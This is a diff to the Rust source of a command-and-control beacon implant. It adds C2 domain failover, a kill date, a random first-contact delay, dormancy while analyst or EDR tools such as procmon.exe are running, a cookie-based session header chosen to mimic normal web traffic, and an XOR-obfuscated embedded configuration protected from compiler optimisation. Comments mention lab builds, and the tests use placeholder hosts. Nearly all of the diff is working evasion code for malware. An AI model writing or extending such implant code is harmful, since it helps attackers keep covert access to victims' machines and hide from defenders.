@@ -1,6 +1,6 @@
 use abraham_common::crypto::{self, ClientHello, Session};
 use abraham_common::frame::open_frames;
-use abraham_common::http::{read_response, write_request, HDR_HANDSHAKE, HDR_SESSION};
+use abraham_common::http::{read_response, write_request, HDR_HANDSHAKE};
 use abraham_common::message::{
     self, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
 };
@@ -41,20 +41,40 @@ const CHUNK_SIZE: usize = 60_000;
 /// the failure pattern indistinguishable from a polling client.
 const RECONNECT_MIN_SECS: u64 = 5;
 const RECONNECT_MAX_SECS: u64 = 300;
+/// Consecutive transport failures before rotating to the next
+/// configured front (T035 failover).
+const FAILOVER_AFTER: u32 = 3;
 /// Upper bound for one HTTP request/response exchange. Cover transports
 /// behind proxies (CDN edges, redirectors) may silently drop a connection
 /// while the local socket still reports it established; without a bound
 /// the beacon blocks forever on a read that never returns.
 const POST_TIMEOUT: Duration = Duration::from_secs(30);
 
+/// Environment gates evaluated before first contact (T035): a random
+/// activation delay breaks the "process start → immediate HTTPS beacon"
+/// correlation, and a blocked-process list keeps the implant dormant on
+/// analyst/EDR workstations (SUNBURST-style environment check).
+#[derive(Debug, Default, Clone, serde::Deserialize)]
+struct Gates {
+    #[serde(default)]
+    initial_delay_max_secs: u64,
+    #[serde(default)]
+    blocked_processes: Vec<String>,
+}
+
 /// Everything the beacon loop needs, resolved once at startup from
 /// either the embedded build configuration or (lab builds) the flags.
 struct Config {
-    server: String,
+    /// C2 front addresses ("host:port") in priority order; the loop
+    /// fails over to the next after repeated consecutive failures.
+    servers: Vec<String>,
     key_hex: String,
     tls_pin_hex: Option<String>,
     evasion_spec: String,
     profile: Profile,
+    /// Unix timestamp after which the implant exits silently (0 = off).
+    kill_date: u64,
+    gates: Gates,
 }
 
 #[cfg(feature = "lab-args")]
@@ -77,13 +97,14 @@ fn arg_opt(flag: &str) -> Option<String> {
 }
 
 /// Decodes the embedded configuration (see build.rs for the layout:
-/// five length-prefixed fields under a build-random XOR keystream).
+/// one u32-length-prefixed JSON blob under a build-random XOR
+/// keystream).
 fn decode_embedded() -> Option<Config> {
     // Every byte is read through `read_volatile`: with LTO the optimizer
     // would otherwise constant-fold the whole XOR and materialize the
     // plaintext as a `.rdata` constant, defeating the keystream.
     let cipher_len = unsafe { std::ptr::read_volatile(&embedded_config::CONFIG_CIPHER.len()) };
-    if cipher_len == 0 {
+    if cipher_len < 4 {
         return None;
     }
     let cipher_ptr = embedded_config::CONFIG_CIPHER.as_ptr();
@@ -99,38 +120,83 @@ fn decode_embedded() -> Option<Config> {
         };
         *slot = c ^ k;
     }
-    let mut fields: Vec<String> = Vec::with_capacity(5);
-    let mut offset = 0usize;
-    while offset + 2 <= plain.len() && fields.len() < 5 {
-        let len = u16::from_be_bytes([plain[offset], plain[offset + 1]]) as usize;
-        offset += 2;
-        if offset + len > plain.len() {
-            return None;
-        }
-        fields.push(String::from_utf8_lossy(&plain[offset..offset + len]).into_owned());
-        offset += len;
-    }
+    let blob_len = u32::from_be_bytes([plain[0], plain[1], plain[2], plain[3]]) as usize;
+    let embedded: Option<serde_json::Value> = if 4 + blob_len <= plain.len() {
+        serde_json::from_slice(&plain[4..4 + blob_len]).ok()
+    } else {
+        None
+    };
     secure_clear(&mut plain);
-    if fields.len() != 5 {
+    parse_embedded_json(embedded?)
+}
+
+/// Parses the decoded embed JSON into a [`Config`]; separated from the
+/// XOR plumbing so the schema (servers, legacy alias, gates) is
+/// unit-testable without a build-time blob.
+fn parse_embedded_json(json: serde_json::Value) -> Option<Config> {
+    let str_field = |name: &str| -> String {
+        json.get(name)
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string()
+    };
+    let mut servers: Vec<String> = json
+        .get("servers")
+        .and_then(|v| v.as_array())
+        .map(|list| {
+            list.iter()
+                .filter_map(|v| v.as_str())
+                .filter(|s| !s.is_empty())
+                .map(str::to_string)
+                .collect()
+        })
+        .unwrap_or_default();
+    // Legacy single-server alias.
+    if servers.is_empty() {
+        let server = str_field("server");
+        if !server.is_empty() {
+            servers.push(server);
+        }
+    }
+    if servers.is_empty() {
         return None;
     }
-    let profile = if fields[4].is_empty() {
+    let key_hex = str_field("key");
+    if key_hex.is_empty() {
+        return None;
+    }
+    let profile_text = str_field("profile");
+    let profile = if profile_text.is_empty() {
         Profile::default()
     } else {
-        Profile::load(&fields[4]).unwrap_or_default()
+        Profile::load(&profile_text).unwrap_or_default()
     };
-    let tls_pin_hex = if fields[2].is_empty() {
+    let tls_pin_hex = if str_field("tls_pin").is_empty() {
         None
     } else {
-        Some(fields[2].clone())
+        Some(str_field("tls_pin"))
     };
     Some(Config {
-        server: fields[0].clone(),
-        key_hex: fields[1].clone(),
+        servers,
+        key_hex,
         tls_pin_hex,
-        evasion_spec: fields[3].clone(),
+        evasion_spec: str_field("evasion"),
         profile,
+        kill_date: json.get("kill_date").and_then(|v| v.as_u64()).unwrap_or(0),
+        gates: json
+            .get("gates")
+            .cloned()
+            .and_then(|g| serde_json::from_value(g).ok())
+            .unwrap_or_default(),
     })
+}
+
+/// Wall-clock seconds since the Unix epoch (kill-date arithmetic).
+fn now_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
 }
 
 fn collect_info(session_token: u64) -> RegisterInfo {
@@ -169,11 +235,13 @@ struct HttpConn<S> {
     stream: S,
     host: String,
     user_agent: String,
-    /// Session token echoed on every POST (X-Session) so the teamserver
-    /// can route the request to this session even when the fronting
-    /// proxy lands it on an origin connection belonging to another
-    /// beacon; the ClientHello POST additionally carries X-Handshake: 1.
-    token: u64,
+    /// Precomputed `Cookie: <profile.cookie_name>=<token>` header sent
+    /// on every POST (T035): a session cookie is what web-fronted
+    /// traffic normally carries, a custom X-Session header is not. The
+    /// ClientHello POST additionally carries X-Handshake: 1 so the
+    /// teamserver can tell it from a frame request before any cookie
+    /// routing happens.
+    cookie: String,
 }
 
 impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
@@ -183,11 +251,10 @@ impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
         // completes. Bound every request/response exchange so the beacon
         // drops the connection and re-links (resuming its session) instead
         // of going silent for the lifetime of the process.
-        let token = self.token.to_string();
         let headers: &[(&str, &str)] = if hello {
-            &[(HDR_HANDSHAKE, "1"), (HDR_SESSION, &token)]
+            &[(HDR_HANDSHAKE, "1"), ("Cookie", &self.cookie)]
         } else {
-            &[(HDR_SESSION, &token)]
+            &[("Cookie", &self.cookie)]
         };
         let exchange = async {
             write_request(
@@ -201,7 +268,9 @@ impl<S: AsyncRead + AsyncWrite + Unpin> HttpConn<S> {
             )
             .await?;
             let resp = read_response(&mut self.stream).await?;
-            if resp.status != 200 {
+            // 204 = empty poll from a 0.2.0+ teamserver: nothing sealed,
+            // nothing to open; any other status is a transport error.
+            if resp.status != 200 && resp.status != 204 {
                 anyhow::bail!("server returned http {}", resp.status);
             }
             Ok(resp.body)
@@ -298,11 +367,42 @@ async fn main() -> anyhow::Result<()> {
         token: rand::random(),
         timing,
     };
+
+    // Kill date (T035): a build stamped with an expiry exits silently
+    // once past it — dead tooling must not keep beaconing (and lab
+    // implants eventually clean themselves up).
+    if config.kill_date != 0 && now_secs() > config.kill_date {
+        return Ok(());
+    }
+
+    // Environment gates (T035): random activation delay before FIRST
+    // contact (breaks process-start → immediate-beacon correlation),
+    // and dormancy while a blocked process (analyst tooling) is running.
+    if config.gates.initial_delay_max_secs > 0 {
+        let delay = rand::random::<u64>() % config.gates.initial_delay_max_secs.max(1);
+        if delay > 0 {
+            tokio::time::sleep(Duration::from_secs(delay)).await;
+        }
+        if config.kill_date != 0 && now_secs() > config.kill_date {
+            return Ok(());
+        }
+    }
+
+    let mut server_idx = 0usize;
+    let mut consecutive_failures = 0u32;
     let mut backoff = RECONNECT_MIN_SECS;
     loop {
+        if !config.gates.blocked_processes.is_empty()
+            && modules::any_process_running(&config.gates.blocked_processes)
+        {
+            // Dormant while the environment is hostile: re-check after
+            // a full backoff window, no contact attempted.
+            tokio::time::sleep(jittered(backoff, 0.2)).await;
+            continue;
+        }
         let mut linked = false;
         match run(
-            &config.server,
+            &config.servers[server_idx],
             &identity,
             &profile,
             pin,
@@ -315,8 +415,21 @@ async fn main() -> anyhow::Result<()> {
             Ok(()) => return Ok(()),
             Err(e) => {
                 note!("[!] session ended: {e}; retrying in {backoff}s");
+                // `e` is only referenced through note! (lab-log builds).
                 let _ = &e;
+                consecutive_failures += 1;
+                // Failover (T035): rotate to the next configured front
+                // after repeated consecutive failures — a seized primary
+                // domain must not strand implants that have a backup.
+                if consecutive_failures >= FAILOVER_AFTER && config.servers.len() > 1 {
+                    server_idx = (server_idx + 1) % config.servers.len();
+                    consecutive_failures = 0;
+                    note!("[*] failing over to {}", config.servers[server_idx]);
+                }
             }
+        }
+        if config.kill_date != 0 && now_secs() > config.kill_date {
+            return Ok(());
         }
         tokio::time::sleep(jittered(backoff, 0.2)).await;
         backoff = if linked {
@@ -354,11 +467,13 @@ fn resolve_config() -> anyhow::Result<Config> {
                 profile.user_agent = ua;
             }
             return Ok(Config {
-                server,
+                servers: vec![server],
                 key_hex,
                 tls_pin_hex: arg_opt("--tls-pin"),
                 evasion_spec: arg_or("--evasion", ""),
                 profile,
+                kill_date: 0,
+                gates: Gates::default(),
             });
         }
     }
@@ -408,7 +523,7 @@ async fn run(
         stream: tls,
         host: host.to_string(),
         user_agent: profile.user_agent.clone(),
-        token: beacon.token,
+        cookie: format!("{}={}", profile.cookie_name, beacon.token),
     };
 
     let (client_secret, client_hello) = ClientHello::generate();
@@ -855,5 +970,49 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
             std::process::exit(0);
         }
         TaskBody::Upload { .. } => Ok(()),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn embed_json_full_schema() {
+        let json = serde_json::json!({
+            "servers": ["a.example:443", "b.example:443"],
+            "key": "11".repeat(32),
+            "tls_pin": "",
+            "evasion": "ekko",
+            "profile": "sleep_secs: 9\njitter: 0.4\n",
+            "kill_date": 1_900_000_000,
+            "gates": {"initial_delay_max_secs": 60, "blocked_processes": ["procmon.exe"]}
+        });
+        let config = parse_embedded_json(json).unwrap();
+        assert_eq!(config.servers.len(), 2);
+        assert_eq!(config.servers[1], "b.example:443");
+        assert_eq!(config.profile.sleep_secs, 9);
+        assert!(config.tls_pin_hex.is_none());
+        assert_eq!(config.kill_date, 1_900_000_000);
+        assert_eq!(config.gates.initial_delay_max_secs, 60);
+        assert_eq!(config.gates.blocked_processes, vec!["procmon.exe"]);
+    }
+
+    #[test]
+    fn embed_json_legacy_server_alias() {
+        let json = serde_json::json!({"server": "c2.example:443", "key": "ab".repeat(32)});
+        let config = parse_embedded_json(json).unwrap();
+        assert_eq!(config.servers, vec!["c2.example:443".to_string()]);
+        assert_eq!(config.kill_date, 0);
+        assert!(config.gates.blocked_processes.is_empty());
+        assert_eq!(config.profile.sleep_secs, Profile::default().sleep_secs);
+    }
+
+    #[test]
+    fn embed_json_rejects_missing_servers_or_key() {
+        assert!(parse_embedded_json(serde_json::json!({"key": "x"})).is_none());
+        assert!(parse_embedded_json(serde_json::json!({"servers": []})).is_none());
+        // No key alongside a server list.
+        assert!(parse_embedded_json(serde_json::json!({"servers": ["a:443"]})).is_none());
     }
 }
